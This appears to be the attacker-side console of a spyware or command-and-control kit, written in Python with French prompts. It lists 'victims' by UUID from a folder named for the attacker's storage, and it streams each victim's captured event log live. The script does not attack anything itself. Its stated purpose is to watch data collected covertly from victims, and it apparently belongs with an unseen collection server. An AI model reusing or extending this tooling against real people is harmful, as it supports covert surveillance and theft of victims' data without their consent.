import os
import json
import time

STORAGE = "../attaquant/stockage/"

def list_victims():
    if not os.path.exists(STORAGE):
        print("Aucun dossier de stockage trouvé. Lancez le serveur d'abord.")
        return
    victims = os.listdir(STORAGE)
    print("Victimes détectées :")
    for v in victims:
        print(" -", v)

def live_logs(victim):
    path = os.path.join(STORAGE, victim, "events.jsonl")
    if not os.path.exists(path):
        print("Aucun log pour cette victime.")
        return

    print(f"Streaming des logs pour {victim}...\n")
    with open(path, "r") as f:
        f.seek(0,2)
        while True:
            line = f.readline()
            if line:
                print(line.strip())
            time.sleep(0.5)

if __name__ == "__main__":
    print("1) Lister victimes")
    print("2) Voir logs en temps réel")
    choice = input("Choix : ")

    if choice == "1":
        list_victims()

    elif choice == "2":
        v = input("UUID de la victime : ")
        live_logs(v)